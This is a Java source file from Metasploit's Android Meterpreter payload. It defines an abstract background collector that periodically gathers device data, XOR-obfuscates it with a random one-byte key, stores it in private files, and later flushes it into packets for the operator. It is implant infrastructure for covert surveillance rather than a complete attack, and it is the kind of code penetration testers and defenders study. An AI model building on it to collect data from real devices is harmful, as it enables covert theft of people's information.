package com.metasploit.meterpreter;

import android.content.Context;

import java.io.ByteArrayOutputStream;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.List;
import java.util.Random;

import android.util.Log;

public abstract class IntervalCollector {
    protected final int collectorId;
    protected final Context context;
    protected long timeout;

    private final Random random;
    private boolean isCollecting;
    private Thread thread;
    private BlockingQueue queue;

    private class IntervalRunner implements Runnable { private final IntervalCollector collector;

        public IntervalRunner(IntervalCollector collector) {
            this.collector = collector;
        }

        public void run() {
            this.collector.threadFunc();
        }
    }

    protected IntervalCollector(int collectorId, Context context, long timeout) {
        this.collectorId = collectorId;
        this.context = context;
        this.random = new Random();
        this.timeout = timeout;

        // use an array blocking queue of length 1, which is used
        // as a mechanism to stop the processing if required.
        this.queue = new ArrayBlockingQueue(1);
    }

    protected IntervalCollector(int collectorId, Context context) {
        this.collectorId = collectorId;
        this.context = context;
        this.random = new Random();

        // use an array blocking queue of length 1, which is used
        // as a mechanism to stop the processing if required.
        this.queue = new ArrayBlockingQueue(1);
    }

    private void writeToDisk(ByteArrayOutputStream bytes) {
        byte[] content = bytes.toByteArray();
        byte[] rnd = new byte[1];
        this.random.nextBytes(rnd);

        for (int i = 0; i < content.length; ++i) {
            content[i] = (byte)(content[i] ^ rnd[0]);
        }

        try {
            FileOutputStream outStream = this.context.openFileOutput(this.fileName(), Context.MODE_PRIVATE);
            outStream.write(rnd);
            outStream.write(content);
            outStream.close();
        }
        catch (IOException e) {
            // we failed, move on.
        }
    }

    public boolean loadFromDisk() {
        try {
            FileInputStream fileStream = this.context.openFileInput(this.fileName());
            byte xor = (byte)fileStream.read();
            byte[] buffer = new byte[1024];
            int bytesRead = 0;
            ByteArrayOutputStream memStream = new ByteArrayOutputStream();

            while (true) {
                bytesRead = fileStream.read(buffer, 0, buffer.length);
                if (bytesRead == -1) {
                    break;
                }

                for (int i = 0; i < bytesRead; ++i) {
                    buffer[i] = (byte)(buffer[i] ^ xor);
                }
                memStream.write(buffer);
            }

            byte[] content = memStream.toByteArray();

            DataInputStream inputStream = new DataInputStream(new ByteArrayInputStream(content));
            try {
                this.loadFromMemory(inputStream);
            } catch(Exception ex) {
                // Something crashed loading from the save file, keep on trucking
                Log.d("loadFromDisk", "Corrupted storage data", ex);
            }
            inputStream.close();
            return true;
        }
        catch (IOException e) {
            // we failed, move on.
            return false;
        }
    }

    private void threadFunc() {
      boolean firstRun = true;
      this.init();
      this.isCollecting = true;

      while (this.isRunning()) {
          try {
              if (firstRun || this.queue.poll(this.timeout, TimeUnit.SECONDS) == null) {
                  firstRun = false;
                  // timeout occured and nothing was in the queue, so process
                  // the collection
                  if (this.isCollecting) {
                      ByteArrayOutputStream bytes = new ByteArrayOutputStream();
                      DataOutputStream output = new DataOutputStream(bytes);
                      if (this.collect(output)) {
                          this.writeToDisk(bytes);
                      }
                  }
              }
              else {
                  // something was put in the queue, which is our signal to finish
                  this.thread = null;
              }
          }
          catch (IOException e) {
              // failed to read "stuff" from file, so delete the file
              // and move on
              // TODO: delete file
          }
          catch (InterruptedException e) {
              // something went wrong, so bail out.
              this.thread = null;
          }
      }
      this.deinit();
    }

    public void start() {
        this.thread = new Thread(new IntervalRunner(this));
        this.thread.start();
    }

    public void pause() {
        this.isCollecting = false;
    }

    public void resume() {
        this.isCollecting = true;
    }

    public void stop() {
        // we add an element to the queue, as this is how we
        // simulate the signal for exiting
        this.queue.add(new Object());
    }

    public boolean dump(TLVPacket packet) {
        if (flush(packet)) {
            this.context.deleteFile(this.fileName());
            return true;
        }
        return false;
    }

    public boolean isRunning() {
        return this.thread != null;
    }

    protected long getTimeout() {
        return this.timeout;
    }

    private String fileName() {
        return "" + this.collectorId;
    }

    protected abstract boolean collect(DataOutputStream output) throws IOException;
    protected abstract void init();
    protected abstract void deinit();
    protected abstract boolean flush(TLVPacket packet);
    protected abstract void loadFromMemory(DataInputStream input) throws IOException;
}

